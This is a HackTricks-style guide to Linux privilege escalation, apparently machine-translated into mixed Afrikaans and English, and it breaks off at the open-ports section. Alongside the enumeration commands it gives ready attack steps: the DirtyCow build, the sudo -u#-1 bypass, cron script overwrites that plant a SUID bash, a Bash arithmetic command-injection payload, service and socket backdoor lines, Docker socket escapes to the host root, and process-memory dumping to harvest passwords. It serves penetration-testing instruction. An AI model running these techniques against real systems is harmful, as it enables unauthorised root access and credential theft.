# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Stelselinligting

### OS-inligting

Kom ons begin om inligting oor die lopende OS te versamel.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pad

As jy **skryfpermissies het op enige gids binne die `PATH`** veranderlike, kan jy dalk sekere libraries of binaries kaap:
```bash
echo $PATH
```
### Omgewingsinligting

Interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kontroleer die kernel-weergawe en kyk of daar 'n exploit is wat gebruik kan word om voorregte te eskaleer
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan 'n goeie lys van kwetsbare kernel weergawes en sommige reeds **compiled exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Ander webwerwe waar jy sommige **compiled exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwetsbare kernel weergawes vanaf daardie web te onttrek kan jy doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gereedskap wat kan help om na kernel-exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Soek altyd **die kernel-weergawe op Google**, dalk is jou kernel-weergawe in 'n kernel exploit neergeskryf en sal jy seker wees dat hierdie exploit geldig is.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-weergawe

Gebaseer op die kwesbare sudo-weergawes wat verskyn in:
```bash
searchsploit sudo
```
Jy kan nagaan of die sudo-weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Kyk na **smasher2 box of HTB** vir 'n **voorbeeld** van hoe hierdie vuln uitgebuit kan word
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Lys moontlike verdedigings

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

As jy binne 'n docker container is, kan jy probeer om daaruit te ontsnap:


{{#ref}}
docker-security/
{{#endref}}

## Skywe

Kontroleer **wat gemonteer en nie-gemonteer is**, waar en waarom. As iets nie-gemonteer is, kan jy probeer om dit te monteer en te soek na privaat inligting.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Lys nuttige binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kontroleer ook of **any compiler is installed**. Dit is nuttig as jy 'n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit op die masjien te compileer waar jy dit gaan gebruik (of op 'n soortgelyke masjien).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Geïnstalleerde kwesbare sagteware

Kyk na die **weergawe van die geïnstalleerde pakkette en dienste**. Miskien is daar 'n ou Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word vir privilege escalation…\
Dit word aanbeveel om handmatig die weergawes van die meer verdagte geïnstalleerde sagteware te kontroleer.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om na verouderde en kwesbare sagteware wat op die masjien geïnstalleer is te kyk.

> [!NOTE] > _Neem asseblief kennis dat hierdie kommando's baie inligting sal wys wat meestal onbruikbaar sal wees; daarom word toepassings soos OpenVAS of soortgelyke aanbeveel wat sal nagaan of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits_

## Prosesse

Kyk na **watter prosesse** uitgevoer word en kontroleer of enige proses **meer voorregte as wat dit behoort te hê** (miskien 'n tomcat wat deur root uitgevoer word?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** identifiseer dit deur die `--inspect` parameter in die command line van die proses na te gaan.\
Kontroleer ook jou privileges oor die processes binaries, dalk kan jy iemand oorskryf.

### Prosesmonitering

Jy kan gereedskap soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer 'n stel vereistes bereik word.

### Prosesgeheue

Sommige dienste op 'n server stoor **credentials in clear text inside the memory**.\
Normaalweg sal jy **root privileges** nodig hê om die geheue van prosesse wat aan ander gebruikers behoort te lees, daarom is dit gewoonlik meer nuttig wanneer jy reeds root is en meer credentials wil ontdek.\
Onthou egter dat **as 'n gewone gebruiker jy die geheue van die prosesse wat jy besit kan lees**.

> [!WARNING]
> Neem asseblief kennis dat deesdae die meeste masjiene **nie ptrace by verstek toelaat nie**, wat beteken dat jy nie ander prosesse wat aan jou ongepriviligeerde gebruiker behoort kan dump nie.
>
> Die lêer _**/proc/sys/kernel/yama/ptrace_scope**_ beheer die toeganklikheid van ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle prosesse kan gedebugeer word, solank hulle dieselfde uid het. Dit is die klassieke wyse waarop ptracing gewerk het.
> - **kernel.yama.ptrace_scope = 1**: slegs 'n ouerproses kan gedebugeer word.
> - **kernel.yama.ptrace_scope = 2**: Slegs admin kan ptrace gebruik, aangesien dit die CAP_SYS_PTRACE vermoë vereis.
> - **kernel.yama.ptrace_scope = 3**: Geen prosesse mag met ptrace getrace word nie. Sodra dit gestel is, is 'n herbegin nodig om ptracing weer te aktiveer.

#### GDB

Indien jy toegang het tot die geheue van 'n FTP-diens (byvoorbeeld) kan jy die Heap kry en daarin na sy credentials soek.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skrip
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses-ID wys **maps hoe geheue binne daardie proses se** virtuele adresruimte; dit wys ook die **toestemmings van elke gemapte gebied**. Die **mem** pseudo-lêer **blootstel die proses se geheue self**. Uit die **maps** lêer weet ons watter **geheuegebiede leesbaar is** en hul offsets. Ons gebruik hierdie inligting om **in die mem file te seek en alle leesbare gebiede te dump** na 'n lêer.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan met /dev/kmem benader word.\
Gewoonlik is `/dev/mem` slegs deur **root** en die **kmem**-groep geleesbaar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump is 'n Linux-herontwerp van die klassieke ProcDump-instrument uit die Sysinternals-suite van instrumente vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om die geheue van 'n proses te dump, kan jy die volgende gebruik:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan handmatig die root-vereistes verwyder en die proses wat aan jou behoort dump
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root word vereis)

### Inlogbesonderhede uit prosesgeheue

#### Handmatige voorbeeld

As jy sien dat die authenticator-proses aan die gang is:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die process dump (sien vorige afdelings om verskillende maniere te vind om die memory van 'n process te dump) en soek vir credentials binne die memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **steel duidelike teks inlogbewyse uit die geheue** en uit sommige **welbekende lêers**. Dit vereis root-voorregte om behoorlik te werk.

| Kenmerk                                           | Prosesnaam           |
| ------------------------------------------------- | -------------------- |
| GDM wagwoord (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Soek Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geskeduleerde/Cron jobs

Kontroleer of enige geskeduleerde job kwesbaar is. Miskien kan jy voordeel trek uit 'n script wat deur root uitgevoer word (wildcard vuln? kan jy lêers wat root gebruik wysig? gebruik symlinks? skep spesifieke lêers in die gids wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron pad

Byvoorbeeld, binne _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op hoe die gebruiker "user" skryfregte oor /home/user het_)

As in hierdie crontab die root-gebruiker probeer om 'n opdrag of script uit te voer sonder om die PATH te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\  
Dan kan jy 'n root-shell kry deur die volgende te gebruik:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wat 'n skrip met 'n wildcard gebruik (Wildcard Injection)

As 'n skrip wat deur root uitgevoer word 'n “**\***” in 'n opdrag bevat, kan jy dit uitbuit om onverwagte dinge te doen (soos privesc). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildcard voorafgegaan word deur 'n pad soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **nie).**

Lees die volgende bladsy vir meer wildcard-uitbuitingstegnieke:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash voer parameter expansion en command substitution uit voordat arithmetic evaluation in ((...)), $((...)) en let plaasvind. As 'n root cron/parser onbetroubare log fields lees en dit in 'n arithmetic context voer, kan 'n aanvaller 'n command substitution $(...) injekteer wat as root uitgevoer word wanneer die cron loop.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Tipiese kwesbare patroon:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Uitbuiting: Laat attacker-controlled teks geskryf word in die geparsde log sodat die numeriese-uitziende veld 'n command substitution bevat en eindig met 'n syfer. Verseker jou command druk nie na stdout nie (of herlei dit) sodat die arithmetic geldig bly.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

As jy **can modify a cron script** wat deur root uitgevoer word, kan jy baie maklik 'n shell kry:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
As die script wat deur root uitgevoer word 'n **directory waar jy volle toegang het** gebruik, kan dit nuttig wees om daardie folder te verwyder en **'n symlink folder na 'n ander een te skep** wat 'n script uitvoer wat deur jou beheer word.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Gereelde cron jobs

Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy dit benut en escalate privileges.

Byvoorbeeld, om **elke 0.1s vir 1 minuut te moniteer**, **op minder uitgevoerde commands te sorteer** en die commands wat die meeste uitgevoer is te verwyder, kan jy dit doen:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook gebruik** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal elke proses wat begin, monitor en lys).

### Onsigbare cron jobs

Dit is moontlik om 'n cronjob te skep deur 'n carriage return na 'n comment te plaas (sonder newline character), en die cronjob sal werk. Voorbeeld (let op die carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Skryfbare _.service_ lêers

Kyk of jy enige `.service` lêer kan skryf, as jy dit kan, kan jy dit **wysig** sodat dit jou **backdoor** **uitvoer wanneer** die diens **gestart**, **herbegin** of **gestop** word (jy mag dalk moet wag totdat die masjien herbegin word).\
Byvoorbeeld, skep jou backdoor binne die `.service` lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare diens-binaries

Hou in gedagte dat as jy **skryftoestemmings oor binaries wat deur dienste uitgevoer word** het, jy dit kan verander om backdoors in te sit, sodat wanneer die dienste weer uitgevoer word die backdoors uitgevoer sal word.

### systemd PATH - Relatiewe paaie

Jy kan die PATH wat deur **systemd** gebruik word sien met:
```bash
systemctl show-environment
```
As jy vind dat jy in enige van die vouers op die pad kan **write**, kan jy moontlik **escalate privileges**. Jy moet soek na **relative paths being used on service configurations** lêers soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Skep dan 'n **uitvoerbare** lêer met dieselfde naam as die **relatiewe pad-binarie** binne die systemd PATH-gids wat jy kan skryf, en wanneer die diens gevra word om die kwesbare aksie (**Start**, **Stop**, **Reload**) uit te voer, sal jou **backdoor** uitgevoer word (nie-geprivilegieerde gebruikers kan gewoonlik nie dienste begin/stop nie — maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd-eenheidslêers waarvan die naam eindig op `**.timer**` wat `**.service**` lêers of gebeurtenisse beheer. **Timers** kan as 'n alternatief vir cron gebruik word, aangesien hulle ingeboude ondersteuning vir kalender-tydgebeurtenisse en monotoniese tydgebeurtenisse het en asynchroon uitgevoer kan word.

Jy kan al die timers opnoem met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n timer kan wysig, kan jy dit gebruik om sekere instansies van systemd.unit uit te voer (soos 'n `.service` of 'n `.target`)
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Unit is:

> Die unit wat geaktiveer word wanneer hierdie timer verstryk. Die argument is 'n unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Daarom, om hierdie toestemming te misbruik, sal jy die volgende moet doen:

- Vind 'n systemd unit (soos 'n `.service`) wat 'n **writable binary** uitvoer
- Vind 'n systemd unit wat 'n **executing a relative path** gebruik en jy het **writable privileges** oor die **systemd PATH** (om daardie executable te impersonate)

**Leer meer oor timers met `man systemd.timer`.**

### **Timer inskakelen**

Om 'n timer te aktiveer benodig jy root privileges en om die volgende uit te voer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Let daarop dat die **timer** **geaktiveer** word deur 'n symlink na dit te skep op `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) stel **proseskommunikasie** in staat op dieselfde of verskillende masjiene binne klient-bediener modelle. Hulle gebruik standaard Unix-deskriptorlêers vir inter-rekenaarkommunikasie en word opgestel deur middel van `.socket` lêers.

Sockets kan gekonfigureer word met `.socket` lêers.

**Leer meer oor sockets met `man systemd.socket`.** In hierdie lêer kan verskeie interessante parameters gekonfigureer word:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies verskil, maar in samevatting word dit gebruik om **aan te dui waarop dit gaan luister** na die socket (die pad van die AF_UNIX socket-lêer, die IPv4/6 en/of poortnommer om na te luister, ens.)
- `Accept`: Neem 'n boolean-argument. As dit **true** is, word 'n **service-instantie geskep vir elke inkomende verbinding** en slegs die verbindings-socket word daaraan deurgegee. As dit **false** is, word alle luister-sockets self **aan die gestarte service-unit deurgegee**, en slegs een service-unit word geskep vir alle verbindings. Hierdie waarde word geïgnoreer vir datagram-sockets en FIFOs waar 'n enkele service-unit onvoorwaardelik al die inkomende verkeer hanteer. **Standaard is false**. Vir prestasie-redes word dit aanbeveel om nuwe daemons slegs op 'n wyse te skryf wat geskik is vir `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Neem een of meer opdragreëls wat onderskeidelik **uitgevoer word voordat** of **na** die luisterende **sockets**/FIFOs **geskep** en gebind is. Die eerste token van die opdragreël moet 'n absolute lêernaam wees, gevolg deur argumente vir die proses.
- `ExecStopPre`, `ExecStopPost`: Bykomende **opdragte** wat onderskeidelik **uitgevoer word voordat** of **na** die luisterende **sockets**/FIFOs **gesluit** en verwyder word.
- `Service`: Spesifiseer die **service**-unit naam **om te aktiveer** by **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sockets met Accept=no. Die standaard is die service wat dieselfde naam as die socket dra (met die agtervoegsel vervang). In meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Writable .socket files

As jy 'n **skryfbare** `.socket` lêer vind kan jy aan die begin van die `[Socket]` afdeling iets soos: `ExecStartPre=/home/kali/sys/backdoor` **byvoeg** en die backdoor sal uitgevoer word voordat die socket geskep word. Daarom sal jy **waarskynlik moet wag totdat die masjien herbegin is.**\
_Noot dat die stelsel daardie socket-lêerkonfigurasie moet gebruik anders sal die backdoor nie uitgevoer word nie_

### Writable sockets

As jy enige **skryfbare socket** identifiseer (_nou praat ons oor Unix Sockets en nie oor die config `.socket` lêers nie_), dan **kan jy kommunikeer** met daardie socket en moontlik 'n kwesbaarheid uitbuit.

### Enumereer Unix Sockets
```bash
netstat -a -p --unix
```
### Ruwe verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Voorbeeld van eksploitasie:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Let op dat daar moontlik sommige **sockets listening for HTTP** versoeke (_Ek praat nie oor .socket files nie, maar oor die lêers wat as unix sockets optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If die socket **met 'n HTTP** versoek reageer, kan jy daarmee **kommunikeer** en dalk **'n kwesbaarheid exploit**.

### Skryfbare Docker Socket

Die Docker socket, wat dikwels by `/var/run/docker.sock` gevind word, is 'n kritieke lêer wat beveilig moet word. By verstek is dit skryfbaar deur die `root` gebruiker en lede van die `docker` groep. Besit van write access tot hierdie socket kan lei tot privilege escalation. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Privilege Escalation with Docker CLI**

As jy write access tot die Docker socket het, kan jy privileges escalate met die volgende opdragte:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hierdie opdragte laat jou toe om 'n container met root-vlak toegang tot die gasheer se lêerstelsel te laat loop.

#### **Docker API direk gebruik**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker socket steeds gemanipuleer word deur die Docker API en `curl` opdragte.

1.  **List Docker Images:** Haal die lys van beskikbare images op.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Stuur 'n versoek om 'n container te skep wat die gasheerstelsel se root-gids mount.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start die pas geskepte container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Gebruik `socat` om 'n verbinding met die container te vestig, wat toelaat dat jy opdragte daarin kan uitvoer.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Na die opstelling van die `socat`-verbinding kan jy opdragte direk in die container uitvoer met root-vlak toegang tot die gasheer se lêerstelsel.

### Ander

Neem kennis dat as jy skryfregte oor die docker socket het omdat jy **binne die groep `docker`** is, jy [**meer maniere om voorregte te eskaleer**](interesting-groups-linux-pe/index.html#docker-group). As die [**docker API op 'n poort luister** kan jy dit ook kompromitteer](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk na **meer maniere om uit docker te breek of dit te misbruik om voorregte te eskaleer** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) voorregte eskalering

As jy uitvind dat jy die **`ctr`** opdrag kan gebruik, lees die volgende bladsy aangesien **jy dit moontlik kan misbruik om voorregte te eskaleer**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** voorregte eskalering

As jy uitvind dat jy die **`runc`** opdrag kan gebruik, lees die volgende bladsy aangesien **jy dit moontlik kan misbruik om voorregte te eskaleer**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is 'n gesofistikeerde **inter-proses kommunikasie (IPC)-stelsel** wat toepassings in staat stel om doeltreffend te kommunikeer en data te deel. Ontwerp met die moderne Linux-stelsel in gedagte, bied dit 'n robuuste raamwerk vir verskeie vorme van toepassingskommunikasie.

Die stelsel is veelsydig en ondersteun basiese IPC wat data-uitruiling tussen prosesse verbeter, soortgelyk aan **enhanced UNIX domain sockets**. Verder help dit met die uitsend van gebeurtenisse of seine, wat naatlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth-daemon oor 'n inkomende oproep kan 'n musiekspeler veroorsaak om te demp, wat die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus 'n remote object-stelsel, wat diensversoeke en metode-oproepe tussen toepassings vereenvoudig en prosesse wat tradisioneel kompleks was, stroomlyn.

D-Bus werk op 'n **toelaat/weier-model**, en bestuur boodskaptoestemmings (metode-oproepe, seinuitsendings, ens.) gebaseer op die kumulatiewe effek van ooreenstemmende beleidsreëls. Hierdie beleide spesifiseer interaksies met die bus en kan moontlik vir voorregte eskalering misbruik word deur hierdie toestemmings uit te buit.

'n Voorbeeld van so 'n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf, wat die toestemmings vir die root-gebruiker beskryf om `fi.w1.wpa_supplicant1` te besit, na te stuur en boodskappe daarvan te ontvang.

Beleide sonder 'n gespesifiseerde gebruiker of groep geld universeel, terwyl "default" konteksbeleide van toepassing is op almal wat nie deur ander spesifieke beleide gedek word nie.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hoe om 'n D-Bus kommunikasie te enumerate en te exploit hier:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netwerk**

Dit is altyd interessant om die netwerk te enumerate en die posisie van die masjien uit te vind.

### Generiese enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Oop poorte

Kontroleer altyd netwerkdienste wat op die masjien loop en waarmee jy nie kon kommunikeer voordat jy toegang daartoe verkry het nie:
